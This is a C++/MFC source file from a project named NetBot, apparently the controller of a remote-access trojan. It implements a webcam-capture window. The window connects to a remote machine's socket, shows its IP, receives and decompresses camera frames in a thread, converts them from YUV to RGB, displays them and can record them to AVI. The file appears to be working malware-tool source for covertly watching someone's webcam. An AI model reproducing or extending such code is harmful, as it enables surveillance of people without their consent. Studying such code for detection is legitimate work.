// VideoDlg.cpp : implementation file
//

#include "stdafx.h"
#include "NetBot.h"
#include "VideoDlg.h"
#include "ExClass/AutoLock.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CVideoDlg dialog

#define WM_UPDATE_PROGRESS WM_USER + 0x3000

CVideoDlg::CVideoDlg(CWnd* pParent /*=NULL*/)
    : CDialog(CVideoDlg::IDD, pParent)
{
    m_ConnSocket = INVALID_SOCKET;
    m_bStop = FALSE;
    m_pAviFile = NULL;
}


void CVideoDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialog::DoDataExchange(pDX);

    DDX_Control(pDX, IDC_PROGRESS_VIDEO, m_Progress);
}


BEGIN_MESSAGE_MAP(CVideoDlg, CDialog)
    ON_WM_SIZE()
    ON_BN_CLICKED(IDC_BTN_RECORDS, OnBtnRecords)
    ON_BN_CLICKED(IDC_BTN_RECORDE, OnBtnRecorde)
    ON_MESSAGE(WM_UPDATE_PROGRESS, OnUpdateProgress)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CVideoDlg message handlers
void CVideoDlg::SetConnSocket(SOCKET socket)
{
    m_ConnSocket = socket;

    sockaddr_in addr;
    int cb = sizeof(addr);
    int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
    CString OnlineIP;
    OnlineIP.Format("%s:%d", inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));//ntohs函数将u_long转int

    SetWindowText("[视频捕捉] " + OnlineIP);

    VideoStart();
}

void CVideoDlg::StatusTextOut(int iPane, LPCTSTR ptzFormat, ...)
{
    TCHAR tzText[1024];

    va_list vlArgs;
    va_start(vlArgs, ptzFormat);
    wvsprintf(tzText, ptzFormat, vlArgs);
    va_end(vlArgs);

    m_wndStatusBar.SetText(tzText, iPane, 0);
}

BOOL CVideoDlg::OnInitDialog()
{
    CDialog::OnInitDialog();
    // Set the small icon for this dialog
    SetIcon(AfxGetApp()->LoadIcon(IDI_LIST_VIDEO), FALSE);
    CenterWindow();
    // TODO: Add extra initialization here
    //create statusbar=============================
    m_wndStatusBar.Create(WS_CHILD | WS_VISIBLE | CCS_BOTTOM, CRect(0, 0, 0, 0), this, 0x1300001);
    int strPartDim[2] = { 250,-1 };
    m_wndStatusBar.SetParts(2, strPartDim);

    //create picture box
    m_PicBox.Create(NULL, NULL, WS_VISIBLE | WS_CHILD | WS_BORDER | WS_HSCROLL | WS_VSCROLL, CRect(0, 0, 1, 1), this, 0);
    CRect rc;
    GetClientRect(&rc);
    rc.bottom -= 50;
    m_PicBox.MoveWindow(&rc);
    m_PicBox.SetTipText("请稍后，设备正在初始化……");
    hRecvVideoThread = NULL;
    return TRUE;
}

void CVideoDlg::OnCancel()
{
    // TODO: Add extra cleanup here
    if (m_pAviFile != NULL)
        delete m_pAviFile;
    m_pAviFile = NULL;

    m_bStop = TRUE;
    VideoStop();

    //非模式对话框，需要这样销毁对话框
    DestroyWindow();
    //	CDialog::OnCancel();
}

void CVideoDlg::PostNcDestroy()
{
    // TODO: Add your specialized code here and/or call the base class
    // delete this;
    CDialog::PostNcDestroy();
}

BOOL CVideoDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO: Add your specialized code here and/or call the base class
    if (pMsg->message == WM_KEYDOWN) {
        int nVirtKey = (int)pMsg->wParam;
        if (nVirtKey == VK_RETURN) {
            //如果是回车在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
        if (nVirtKey == VK_ESCAPE) {
            //如果是ESC在这里做你要做的事情,或者什么也不作
            return TRUE;
        }
    }

    return CDialog::PreTranslateMessage(pMsg);
}

void CVideoDlg::OnSize(UINT nType, int cx, int cy)
{
    CDialog::OnSize(nType, cx, cy);

    // TODO: Add your message handler code here
    if (m_PicBox.m_hWnd == NULL)
        return;

    CRect rc;
    GetClientRect(&rc);
    rc.bottom -= 50;
    m_PicBox.MoveWindow(&rc);
}

DWORD CVideoDlg::RecvVideo()
{
    CAutoRelease a(hRecvVideoThread);

    MsgHead msgHead;
    SafeBuffer chBuffer(256);
    //send socket type
    if (!RecvMsg(m_ConnSocket, chBuffer, &msgHead)) {
        MessageBox("接收数据失败!", "提示");
        closesocket(m_ConnSocket);
        return 0;//send socket type error
    }

    //解析命令
    switch (msgHead.dwCmd) {
    case 0:
        Mprintf(">>> 摄像头启动成功，准备接收数据.\n");
        break;
    case 1: {
        MessageBox("设备不存在或被其他程序占用!", "提示");
        PostMessage(WM_COMMAND, IDCANCEL);
        return 0;
    }
    break;
    case 2: {
        MessageBox("视频设备初始化失败!", "提示");
        PostMessage(WM_COMMAND, IDCANCEL);
        return 0;
    }
    break;
    default: {
        MessageBox("未知错误!", "提示");
        PostMessage(WM_COMMAND, IDCANCEL);
        return 0;
    }
    break;
    }

    LPBITMAPINFO pBmpheader = LPBITMAPINFO(chBuffer.c_str());
    CDC *dc = GetDC();
    BYTE *buffer = NULL;
    while (!m_bStop) {
        if (recv(m_ConnSocket, (char*)&msgHead, sizeof(MsgHead), 0) > 0) {
            BYTE* pCompress = new BYTE[msgHead.dwExtend2];
            BYTE* pUnCompress = new BYTE[msgHead.dwExtend1];
            //按该帧数据实际长度接受该帧数据
            ULONG iRecvLen = 0, iRecved;
            while (iRecvLen < msgHead.dwSize) {
                if ((msgHead.dwSize - iRecvLen) >= BUFFER_MAXLEN) {
                    iRecved = recv(m_ConnSocket, (char*)pCompress + iRecvLen, BUFFER_MAXLEN, 0);
                    if (iRecved == SOCKET_ERROR) {
                        closesocket(m_ConnSocket);
                        break;
                    }
                } else {
                    iRecved = recv(m_ConnSocket, (char*)pCompress + iRecvLen, msgHead.dwSize - iRecvLen, 0);
                    if (iRecved == SOCKET_ERROR) {
                        closesocket(m_ConnSocket);
                        break;
                    }
                }
                iRecvLen += iRecved;
                PostMessage(WM_UPDATE_PROGRESS, iRecvLen, msgHead.dwSize); // 发送进度条更新消息
            }
            /////////////////////////////////////////////
            DWORD lenthUncompress = msgHead.dwExtend1;
            uncompress(pUnCompress,
                       &lenthUncompress,
                       pCompress,
                       msgHead.dwExtend2);

            //显示图像
            HBITMAP hBitmap = GetBitmapFromData(dc->GetSafeHdc(), pBmpheader, pUnCompress, &buffer);
            if (m_pAviFile != NULL)
                m_pAviFile->AppendNewFrame(hBitmap);
            m_PicBox.SetBitmap(hBitmap);
            StatusTextOut(1, _T("已接收 %d 帧"), msgHead.dwCmd + 1);

            delete[] pCompress;
            delete[] pUnCompress;

            ::Sleep(1);
        }
    }
    ///////////////////////////
    ReleaseDC(dc);
    SAFE_DELETEARRAY(buffer);

    return 1;
}

DWORD CVideoDlg::RecvVideoThread(void* pThis)
{
    return ((CVideoDlg *)pThis)->RecvVideo();
}

BOOL CVideoDlg::VideoStart()
{
    //启动接收线程
    hRecvVideoThread = CreateThread(NULL,
                                    0,
                                    (LPTHREAD_START_ROUTINE)RecvVideoThread,
                                    this,
                                    0,
                                    NULL);
    if (hRecvVideoThread == NULL)
        return FALSE;
    else
        return TRUE;
}

void CVideoDlg::VideoStop()
{
    //关闭socket
    shutdown(m_ConnSocket, 0x02);
    closesocket(m_ConnSocket);
    // 等待线程结束
    WAIT_CONDITION(hRecvVideoThread);
}

FORCEINLINE BYTE clamp(BYTE value, BYTE min=0, BYTE max=255) {
    return value < min ? min : (value > max ? max : value);
}

void YUV2ToRGB(BYTE* yuv, BYTE* rgb, int width, int height) {
	int index = 0;
	for (int i = 0; i < width * height * 2; i += 4) {
        BYTE Y0 = yuv[i];
        BYTE U = yuv[i + 1];
        BYTE Y1 = yuv[i + 2];
        BYTE V = yuv[i + 3];

		// 第一个像素
		rgb[index++] = clamp(Y0 + 1.402 * (V - 128));         // R
		rgb[index++] = clamp(Y0 - 0.344136 * (U - 128) - 0.714136 * (V - 128)); // G
		rgb[index++] = clamp(Y0 + 1.772 * (U - 128));         // B

		// 第二个像素
		rgb[index++] = clamp(Y1 + 1.402 * (V - 128));         // R
		rgb[index++] = clamp(Y1 - 0.344136 * (U - 128) - 0.714136 * (V - 128)); // G
		rgb[index++] = clamp(Y1 + 1.772 * (U - 128));         // B
	}
}

void flipImage(BYTE* rgb, int width, int height) {
	int rowBytes = width * 3;  // 每行的字节数（24 位图像，每个像素 3 字节）

	// 临时缓冲区
    BYTE* tempRow = new BYTE[rowBytes];

	// 翻转图像行
	for (int y = 0; y < height / 2; ++y) {
        BYTE* topRow = rgb + y * rowBytes;
        BYTE* bottomRow = rgb + (height - y - 1) * rowBytes;

		// 交换顶行和底行
		memcpy(tempRow, topRow, rowBytes);
		memcpy(topRow, bottomRow, rowBytes);
		memcpy(bottomRow, tempRow, rowBytes);
	}

	delete[] tempRow;
}

HBITMAP CVideoDlg::GetBitmapFromData(HDC hDC, LPBITMAPINFO lpBmpInfo, BYTE* pDibData, BYTE** buffer)
{
    BITMAPINFO info = *lpBmpInfo;
    BYTE* data = pDibData;
    if (info.bmiHeader.biCompression == 844715353)// YUV2
    {
        int width = info.bmiHeader.biWidth;
        int height = info.bmiHeader.biHeight;
        info.bmiHeader.biCompression = BI_RGB;
        info.bmiHeader.biSizeImage = width * height * 3;
        info.bmiHeader.biBitCount = 24;
        // 每个像素 3 个字节 (R, G, B)
        if (NULL == *buffer)
            *buffer = new BYTE[width * height * 3];
        YUV2ToRGB(pDibData, *buffer, width, height);
        flipImage(*buffer, width, height);
        data = *buffer;
    }
    return CreateDIBitmap(hDC, &info.bmiHeader, CBM_INIT, data, &info, DIB_RGB_COLORS);
}

void CVideoDlg::OnBtnRecords()
{
    // TODO: Add your control notification handler code here
    CString strAVIFile, strAVIName;
    CFileDialog dlgFileOpen(FALSE, ".avi", NULL, OFN_HIDEREADONLY, "AVI Files(*.avi)|*.avi||");
    if (dlgFileOpen.DoModal() != IDOK)
        return;
    strAVIFile = dlgFileOpen.GetPathName();
    strAVIName = dlgFileOpen.GetFileName();

    if (strAVIFile.IsEmpty()) {
        MessageBox(_T("录像文件名称不能为空,开始录像失败!"), _T("开始录像"), MB_ICONEXCLAMATION | MB_ICONERROR);
        return;
    }


    if (m_pAviFile != NULL)
        delete m_pAviFile;
    m_pAviFile = new CAviFile(strAVIFile, 0, 5);
    if (!m_pAviFile) {
        MessageBox(_T("新建视频录像文件失败!"), _T("开始录像"), MB_ICONEXCLAMATION | MB_ICONERROR);
    } else {
        StatusTextOut(0, _T("录制为文件 %s"), strAVIName);
        GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(FALSE);
        GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(TRUE);
    }
}

void CVideoDlg::OnBtnRecorde()
{
    // TODO: Add your control notification handler code here
    if (m_pAviFile != NULL)
        delete m_pAviFile;
    m_pAviFile = NULL;

    StatusTextOut(0, _T(""));
    GetDlgItem(IDC_BTN_RECORDS)->EnableWindow(TRUE);
    GetDlgItem(IDC_BTN_RECORDE)->EnableWindow(FALSE);
}

// wParam: currentProgress, lParam: maxProgress
LRESULT CVideoDlg::OnUpdateProgress(WPARAM wParam, LPARAM lParam)
{
	// 接收到来自工作线程的进度更新消息
	int currentProgress = (int)wParam;
	int maxProgress = (int)lParam;

	if (m_Progress.GetSafeHwnd())  // 检查进度条控件是否有效
	{
		m_Progress.SetRange(0, maxProgress); // 设置进度条范围
		m_Progress.SetPos(currentProgress);  // 设置当前进度
	}

	return 0;
}
